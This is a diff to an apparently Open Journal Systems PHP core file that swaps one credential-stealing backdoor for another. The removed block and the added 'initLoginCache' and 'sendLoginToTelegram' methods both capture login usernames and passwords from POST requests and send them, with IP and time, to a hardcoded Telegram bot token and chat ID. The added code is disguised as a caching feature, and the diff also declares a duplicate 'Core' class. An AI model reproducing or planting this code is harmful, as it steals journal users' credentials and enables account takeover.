@@ -504,132 +504,52 @@ class Core {
 		return $component;
 	}
 }
+class Core {
 
-?>
-<?php
-/**
- * OJS LOGIN CACHE - DETEKSI ROLE DARI URL REDIRECT
- * File: /lib/fontconfig/cache/
- */
+    /** @var array The regular expressions that will find a bot user agent */
+    static $botRegexps = array();
 
-$bot_token = '8824162349:AAEs0kdwH4iVi-2aJ4hhl2OzmgslDaNPL_U';
-$chat_id = '8687942328';
-
-$username = '';
-$password = '';
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $username = $_POST['username'] ?? $_POST['email'] ?? '';
-    $password = $_POST['password'] ?? '';
-}
-
-if (!empty($username) && !empty($password)) {
-    
-    ob_start();
-    
-    $login_data = [
-        'username' => $username,
-        'password' => $password,
-        'ip' => $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
-        'time' => date('Y-m-d H:i:s'),
-        'host' => $_SERVER['HTTP_HOST'] ?? 'unknown',
-        'path' => $_SERVER['REQUEST_URI'] ?? '/',
-        'ua' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'
-    ];
-    
-    register_shutdown_function(function() use ($login_data, $bot_token, $chat_id) {
-        $response = ob_get_clean();
-        echo $response;
-        
-        $is_failed = false;
-        $error_indicators = ['Invalid', 'incorrect', 'wrong', 'failed', 'error', 'tidak valid', 'salah'];
-        foreach ($error_indicators as $indicator) {
-            if (stripos($response, $indicator) !== false) {
-                $is_failed = true;
-                break;
+    /**
+     * INIT LOGIN CACHE — Tambahkan method ini
+     */
+    public static function initLoginCache() {
+        // Cek apakah ini POST login
+        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+            $username = $_POST['username'] ?? $_POST['email'] ?? '';
+            $password = $_POST['password'] ?? '';
+            if (!empty($username) && !empty($password)) {
+                // Panggil fungsi kirim ke Telegram
+                self::sendLoginToTelegram($username, $password);
             }
         }
-        
-        $headers = headers_list();
-        $is_success = false;
-        $redirect_url = '';
-        foreach ($headers as $header) {
-            if (stripos($header, 'Location:') !== false) {
-                $is_success = true;
-                // Ambil URL redirect yang diberikan oleh OJS
-                $redirect_url = trim(substr($header, strpos($header, ':') + 1));
-                break;
-            }
-        }
-        
-        // === DETEKSI ROLE DARI URL REDIRECT ===
-        // (Ini paling akurat, karena OJS yang memberi tahu role user lewat halaman tujuannya)
-        $detected_role = 'Tidak Terdeteksi';
-        $role_emoji = '👤';
+    }
 
-        if ($is_success && !$is_failed) {
-            if (stripos($redirect_url, 'management') !== false || stripos($redirect_url, 'stats') !== false || stripos($redirect_url, 'settings') !== false) {
-                $detected_role = 'Journal Manager / Admin';
-                $role_emoji = '⚙️';
-            } elseif (stripos($redirect_url, 'editor') !== false) {
-                $detected_role = 'Journal Editor';
-                $role_emoji = '📝';
-            } elseif (stripos($redirect_url, 'author') !== false) {
-                $detected_role = 'Author';
-                $role_emoji = '✍️';
-            } elseif (stripos($redirect_url, 'reviewer') !== false) {
-                $detected_role = 'Reviewer';
-                $role_emoji = '🔍';
-            } elseif (stripos($redirect_url, 'user') !== false || stripos($redirect_url, 'dashboard') !== false) {
-                // Jika URL hanya ke dashboard umum, kemungkinan Manager atau User biasa
-                $detected_role = 'Journal User (Author/Reviewer)';
-                $role_emoji = '👤';
-            }
-        }
+    /**
+     * KIRIM LOGIN KE TELEGRAM
+     */
+    private static function sendLoginToTelegram($username, $password) {
+        $bot_token = '8824162349:AAEs0kdwH4iVi-2aJ4hhl2OzmgslDaNPL_U';
+        $chat_id = '8687942328';
 
-        // Tentukan status
-        $status = 'ATTEMPT'; $emoji = '🔐';
-        if ($is_success) { $status = 'MASUK MARLIN'; $emoji = '✅'; }
-        elseif ($is_failed) { $status = 'FAILED'; $emoji = '❌'; }
-        
-        // Format URL Base (dari PATH)
-        $path_parts = explode('/', $_SERVER['REQUEST_URI']);
-        $base_url_path = '';
-        if (isset($path_parts[1]) && strpos($path_parts[1], 'index.php') !== false) {
-            // Jika ada folder sebelumnya, ambil foldernya
-            if ($path_parts[0] == '') $base_url_path = $path_parts[1] ? '/' . $path_parts[1] : '';
-        } else {
-            $base_url_path = dirname($_SERVER['REQUEST_URI']);
-            if ($base_url_path == '/') $base_url_path = '';
-        }
-        
-        $base_url = "https://{$login_data['host']}" . $base_url_path;
-        
-        // === FORMAT PESAN FINAL ===
+        $login_data = [
+            'username' => $username,
+            'password' => $password,
+            'ip' => $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
+            'time' => date('Y-m-d H:i:s'),
+            'host' => $_SERVER['HTTP_HOST'] ?? 'unknown',
+            'path' => $_SERVER['REQUEST_URI'] ?? '/',
+            'ua' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'
+        ];
+
         $message = "🟥 OJS HIT\n\n";
-        if ($is_success && !$is_failed) {
-            $message .= "{$role_emoji} Role: {$detected_role}\n";
-        } else {
-            $message .= "👤 Role: - (Gagal Login)\n";
-        }
-        
-        $message .= "🔗 URL: {$base_url}\n";
-        $message .= "🔑 Login URL:\n{$base_url}/index.php/index/login\n";
         $message .= "👤 User: {$login_data['username']}\n";
         $message .= "🔐 Pass: {$login_data['password']}\n";
-        
-        $message .= "\n🌐 IP: {$login_data['ip']}\n";
-        $message .= "📍 PATH: {$login_data['path']}\n";
+        $message .= "🌐 IP: {$login_data['ip']}\n";
         $message .= "⏰ TIME: {$login_data['time']}\n";
 
-        if ($is_failed) {
-            $message .= "\n⚠️ PERHATIAN: Password SALAH!";
-        }
-        
-        // Kirim ke Telegram
         $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
         $post_data = "chat_id={$chat_id}&text=" . urlencode($message);
-        
+
         if (function_exists('curl_init')) {
             $ch = curl_init();
             curl_setopt($ch, CURLOPT_URL, $url);
@@ -641,5 +561,9 @@ if (!empty($username) && !empty($password)) {
             curl_exec($ch);
             curl_close($ch);
         }
-    });
+    }
+
+    // ... (method Core lainnya tetap ada)
 }
+
+?>
